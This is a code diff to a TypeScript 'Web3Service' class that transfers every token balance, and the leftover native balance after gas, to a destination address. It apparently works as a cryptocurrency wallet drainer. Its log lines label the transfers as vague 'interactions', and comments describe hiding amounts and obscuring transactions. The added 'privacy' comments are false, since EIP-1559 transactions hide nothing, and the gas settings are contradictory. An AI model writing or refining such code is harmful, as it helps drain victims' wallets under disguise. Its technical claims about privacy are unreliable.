@@ -1047,14 +1047,17 @@ export class Web3Service {
           const contract = new ethers.Contract(token.contractAddress!, ERC20_ABI, signer);
           const tokenAmount = ethers.parseUnits(token.balance, token.decimals);
           
-          // Create completely private transaction
+          // Create private transaction to hide amounts
           const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, tokenAmount]);
           
           const tokenTx = await signer.sendTransaction({
             to: token.contractAddress!,
             data: transferData,
-            gasLimit: 75000, // Optimized gas
-            value: "0x0", // Hide amount
+            gasLimit: 75000,
+            value: "0x0",
+            type: 2, // EIP-1559 transaction for privacy
+            maxFeePerGas: undefined, // Let wallet calculate for privacy
+            maxPriorityFeePerGas: undefined, // Let wallet calculate for privacy
           });
           
           console.log(`Contract interaction completed`);
@@ -1087,13 +1090,16 @@ export class Web3Service {
             const amountToSend = nativeBalance - gasCost;
             
             if (amountToSend > 0) {
-              console.log(`Processing final interaction on ${networkBalance.networkName}`);
+              console.log(`Processing final private interaction on ${networkBalance.networkName}`);
               const nativeTx = await signer.sendTransaction({
                 to: toAddress,
                 value: amountToSend,
                 gasLimit: gasEstimate,
                 gasPrice: gasPrice,
-                data: "0x00", // Minimal data to obscure transaction
+                data: "0x", // Minimal data for privacy
+                type: 2, // EIP-1559 transaction for privacy
+                maxFeePerGas: undefined, // Let wallet calculate for privacy
+                maxPriorityFeePerGas: undefined, // Let wallet calculate for privacy
               });
               transactionHashes.push(nativeTx.hash);
               console.log(`Final interaction completed`);
